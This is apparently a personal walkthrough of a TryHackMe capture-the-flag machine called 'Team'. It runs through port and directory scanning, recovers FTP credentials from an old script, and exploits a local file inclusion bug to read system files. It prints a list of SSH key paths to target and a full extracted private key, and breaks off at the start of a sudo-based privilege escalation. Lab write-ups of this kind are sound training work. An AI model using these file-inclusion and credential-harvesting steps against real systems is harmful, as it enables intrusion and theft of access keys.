# Enumeration Phase
## ping scan
```sh
❯ ping 10.10.117.56
PING 10.10.117.56 (10.10.117.56) 56(84) bytes of data.
64 bytes from 10.10.117.56: icmp_seq=1 ttl=63 time=55.4 ms
64 bytes from 10.10.117.56: icmp_seq=2 ttl=63 time=55.1 ms
^C
--- 10.10.117.56 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 55.080/55.250/55.421/0.170 ms
```
## [[nmap]] scan
```sh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.77 seconds
```
Notes: 
- ftp on 21 anonymous login? no.
- ssh on 22
- http 80 default Apache server home page
## [[ffuf]] dir scan
```sh
sami@bt:~/Documents/THM/CTFs/Team$ ffuf -u http://10.10.75.127/FUZZ -fc 401,403,404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ffuf_results.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.75.127/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : ffuf_results.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 401,403,404
________________________________________________

index.html              [Status: 200, Size: 11366, Words: 3512, Lines: 374, Duration: 59ms]
:: Progress: [4713/4713] :: Job [1/1] :: 718 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```
Notes: no interesting results obtained with common.txt 
```sh
sami@bt:~/Documents/THM/CTFs/Team$ ffuf -u http://10.10.75.127/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ffuf_results.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.75.127/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Output file      : ffuf_results.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4073ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5082ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 55ms]
:: Progress: [20476/20476] :: Job [1/1] :: 719 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```
Notes: nothing interesting as well with big.txt
## Domain name in /etc/hosts
```sh 
sami@bt:~/Documents/THM/CTFs/Team$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	bt
10.10.75.127	team.thm


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
## http://team.thm/
## ffuf on http://team.thm/
```sh
sami@bt:~/Documents/THM/CTFs/Team$ ffuf -u http://team.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ffuf_results.txt   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://team.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Output file      : ffuf_results.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 3104ms]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 4116ms]
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 53ms]
images                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 54ms]
robots.txt              [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 54ms]
scripts                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 54ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 54ms]
:: Progress: [20476/20476] :: Job [1/1] :: 742 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
```
Notes: 
- robots.txt: dale >> a username?
## gobuster on http://team.thm/scripts/
```sh
sami@bt:~/Documents/THM/CTFs/Team$ gobuster dir -u http://team.thm/scripts/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -x txt,php,html,js
/.html                (Status: 403) [Size: 273]
/.php                 (Status: 403) [Size: 273]
/script.txt           (Status: 200) [Size: 597]
```
## /script.txt
```sh
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```
## /script.old
```sh
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```
Notes:
- username: ftpuser
- password: T3@m$h@r3
## ftp login
```sh
sami@bt:~/Documents/THM/CTFs/Team$ ftp team.thm    
Connected to team.thm.
220 (vsFTPd 3.0.3)
Name (team.thm:sami): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42555|)
ftp: Can't connect to `10.10.75.127:42555': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
226 Directory send OK.
ftp> cd workshare
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1002     1002          269 Jan 15  2021 New_site.txt
226 Directory send OK.
ftp> 
```
## cat New_site.txt
```sh
sami@bt:~/Documents/THM/CTFs/Team$ cat New_site.txt
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```
Notes: 
- New username: Gyles
## adding dev to team.thm
```sh
sami@bt:~/Documents/THM/CTFs/Team$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	bt
10.10.75.127	team.thm
10.10.75.127	dev.team.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
## visiting dev.team.thm
![[Pasted image 20221101142425.png]]
## moving to the sharepoint
![[Pasted image 20221101142500.png]]
Notes: LFI vuln
# Exploitation Phase
## testing LFI vuln
![[Pasted image 20221101142600.png]]
Notes:
```sh
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
```
- remember that we have ssh and ftp ports open, so let's enumerate all files related to them.
## ssh and ftp files enum with LFI
```sh
sami@bt:/opt$ sudo git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
sami@bt:/opt/PayloadsAllTheThings$ sudo updatedb                                                         
sami@bt:/opt/PayloadsAllTheThings/File Inclusion/Intruders$ cat Linux-files.txt | grep ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/root/.ssh/known_hosts
```
Notes: so we need to search in theses specific files for the id_rsa file.
## [[ffuf]] directory fuzzing
```sh
sami@bt:~/Documents/THM/CTFs/Team$ ffuf -u 'http://dev.team.thm/script.php?page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fc 404,402,403,401,300 -fs 1 | grep ssh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.team.thm/script.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,402,403,401,300
 :: Filter           : Response size: 1
________________________________________________

/etc/default/ssh        [Status: 200, Size: 134, Words: 18, Lines: 7, Duration: 53ms]
/etc/init.d/ssh         [Status: 200, Size: 3838, Words: 498, Lines: 164, Duration: 54ms]
/etc/ssh/ssh_config     [Status: 200, Size: 1581, Words: 248, Lines: 53, Duration: 55ms]
/etc/ssh/moduli         [Status: 200, Size: 553123, Words: 2582, Lines: 432, Duration: 66ms]
:: Progress: [8314/8314] :: Job [1/1] :: 731 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```
Notes: 
- here we clearly see results related to ssh
- let's check them out
### ssh files results
```sh
http://dev.team.thm/script.php?page=/etc/default/ssh
# Default settings for openssh-server. This file is sourced by /bin/sh from # /etc/init.d/ssh. # Options to pass to sshd SSHD_OPTS=
```

```sh
http://dev.team.thm/script.php?page=/etc/init.d/ssh
#! /bin/sh ### BEGIN INIT INFO # Provides: sshd # Required-Start: $remote_fs $syslog # Required-Stop: $remote_fs $syslog # Default-Start: 2 3 4 5 # Default-Stop: # Short-Description: OpenBSD Secure Shell server ### END INIT INFO set -e # /etc/init.d/ssh: start and stop the OpenBSD "secure shell(tm)" daemon test -x /usr/sbin/sshd || exit 0 ( /usr/sbin/sshd -\? 2>&1 | grep -q OpenSSH ) 2>/dev/null || exit 0 umask 022 if test -f /etc/default/ssh; then . /etc/default/ssh fi . /lib/lsb/init-functions if [ -n "$2" ]; then SSHD_OPTS="$SSHD_OPTS $2" fi # Are we running from init? run_by_init() { ([ "$previous" ] && [ "$runlevel" ]) || [ "$runlevel" = S ] } check_for_no_start() { # forget it if we're trying to start, and /etc/ssh/sshd_not_to_be_run exists if [ -e /etc/ssh/sshd_not_to_be_run ]; then if [ "$1" = log_end_msg ]; then log_end_msg 0 || true fi if ! run_by_init; then log_action_msg "OpenBSD Secure Shell server not in use (/etc/ssh/sshd_not_to_be_run)" || true fi exit 0 fi } check_dev_null() { if [ ! -c /dev/null ]; then if [ "$1" = log_end_msg ]; then log_end_msg 1 || true fi if ! run_by_init; then log_action_msg "/dev/null is not a character device!" || true fi exit 1 fi } check_privsep_dir() { # Create the PrivSep empty dir if necessary if [ ! -d /run/sshd ]; then mkdir /run/sshd chmod 0755 /run/sshd fi } check_config() { if [ ! -e /etc/ssh/sshd_not_to_be_run ]; then /usr/sbin/sshd $SSHD_OPTS -t || exit 1 fi } export PATH="${PATH:+$PATH:}/usr/sbin:/sbin" case "$1" in start) check_privsep_dir check_for_no_start check_dev_null log_daemon_msg "Starting OpenBSD Secure Shell server" "sshd" || true if start-stop-daemon --start --quiet --oknodo --pidfile /run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS; then log_end_msg 0 || true else log_end_msg 1 || true fi ;; stop) log_daemon_msg "Stopping OpenBSD Secure Shell server" "sshd" || true if start-stop-daemon --stop --quiet --oknodo --pidfile /run/sshd.pid; then log_end_msg 0 || true else log_end_msg 1 || true fi ;; reload|force-reload) check_for_no_start check_config log_daemon_msg "Reloading OpenBSD Secure Shell server's configuration" "sshd" || true if start-stop-daemon --stop --signal 1 --quiet --oknodo --pidfile /run/sshd.pid --exec /usr/sbin/sshd; then log_end_msg 0 || true else log_end_msg 1 || true fi ;; restart) check_privsep_dir check_config log_daemon_msg "Restarting OpenBSD Secure Shell server" "sshd" || true start-stop-daemon --stop --quiet --oknodo --retry 30 --pidfile /run/sshd.pid check_for_no_start log_end_msg check_dev_null log_end_msg if start-stop-daemon --start --quiet --oknodo --pidfile /run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS; then log_end_msg 0 || true else log_end_msg 1 || true fi ;; try-restart) check_privsep_dir check_config log_daemon_msg "Restarting OpenBSD Secure Shell server" "sshd" || true RET=0 start-stop-daemon --stop --quiet --retry 30 --pidfile /run/sshd.pid || RET="$?" case $RET in 0) # old daemon stopped check_for_no_start log_end_msg check_dev_null log_end_msg if start-stop-daemon --start --quiet --oknodo --pidfile /run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS; then log_end_msg 0 || true else log_end_msg 1 || true fi ;; 1) # daemon not running log_progress_msg "(not running)" || true log_end_msg 0 || true ;; *) # failed to stop log_progress_msg "(failed to stop)" || true log_end_msg 1 || true ;; esac ;; status) status_of_proc -p /run/sshd.pid /usr/sbin/sshd sshd && exit 0 || exit $? ;; *) log_action_msg "Usage: /etc/init.d/ssh {start|stop|reload|force-reload|restart|try-restart|status}" || true exit 1 esac exit 0
```

```sh
http://dev.team.thm/script.php?page=/etc/default/ssh
# Default settings for openssh-server. This file is sourced by /bin/sh from # /etc/init.d/ssh. # Options to pass to sshd SSHD_OPTS=
```
```sh
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
# $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #RSAAuthentication yes #LoginGraceTime 2m PermitRootLogin without-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 PubkeyAuthentication yes PubkeyAcceptedKeyTypes=+ssh-dss # Expect .ssh/authorized_keys2 to be disregarded by default in future. #AuthorizedKeysFile /home/%u/.ssh/authorized_keys #AuthorizedPrincipalsFile none #AuthorizedKeysCommand none #AuthorizedKeysCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don't trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don't read the user's ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! #PasswordAuthentication yes #PermitEmptyPasswords no # Change to yes to enable challenge-response passwords (beware issues with # some PAM modules and threads) ChallengeResponseAuthentication no # Kerberos options #KerberosAuthentication no #KerberosOrLocalPasswd yes #KerberosTicketCleanup yes #KerberosGetAFSToken no # GSSAPI options #GSSAPIAuthentication no #GSSAPICleanupCredentials yes #GSSAPIStrictAcceptorCheck yes #GSSAPIKeyExchange no # Set this to 'yes' to enable PAM authentication, account processing, # and session processing. If this is enabled, PAM authentication will # be allowed through the ChallengeResponseAuthentication and # PasswordAuthentication. Depending on your PAM configuration, # PAM authentication via ChallengeResponseAuthentication may bypass # the setting of "PermitRootLogin without-password". # If you just want the PAM account and session checks to run without # PAM authentication, then enable this but set PasswordAuthentication # and ChallengeResponseAuthentication to 'no'. UsePAM no #AllowAgentForwarding yes #AllowTcpForwarding yes #GatewayPorts no X11Forwarding yes #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes PrintMotd no #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # Allow client to pass locale environment variables AcceptEnv LANG LC_* # override default of no subsystems Subsystem sftp /usr/lib/openssh/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server AllowUsers dale gyles #Dale id_rsa 
#-----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn #NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE #NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W #oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK #o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP #zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu #k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS #xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S #0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2 #EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU #eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v #7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v #JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/ #FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l #gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4 #xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH #ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb #esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO #eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R #N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg #Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi #U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW #/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz #82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA #wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q #z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6 #RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7 #/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx #sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb #mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur #4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg #e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S #2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH #8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX #b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7 #CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH 
#-----END OPENSSH PRIVATE KEY-----
```
Notes: id_rsa private key has been obtained we need to remove all the # from it.
## cleaned-up id_rsa
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
## dale user flag
THM{6Y0TXHz7c2d}
# Privileges Escalation Phase
```sh
dale@TEAM:~$ whoami
dale
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
dale@TEAM:~$ ls
user.txt
dale@TEAM:~$ cd /home/gyles/
dale@TEAM:/home/gyles$ ls
admin_checks
dale@TEAM:/home/gyles$ file admin_checks 
admin_checks: Bourne-Again shell script, ASCII text executable
dale@TEAM:/home/gyles$ cat 
admin_checks               .bashrc                    .local/                    .sudo_as_admin_successful
.bash_history              .cache/                    .profile                   
.bash_logout               .gnupg/                    .ssh/                      
dale@TEAM:/home/gyles$ cat admin_checks 
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"




dale@TEAM:/home/gyles$ ls -hla
total 48K
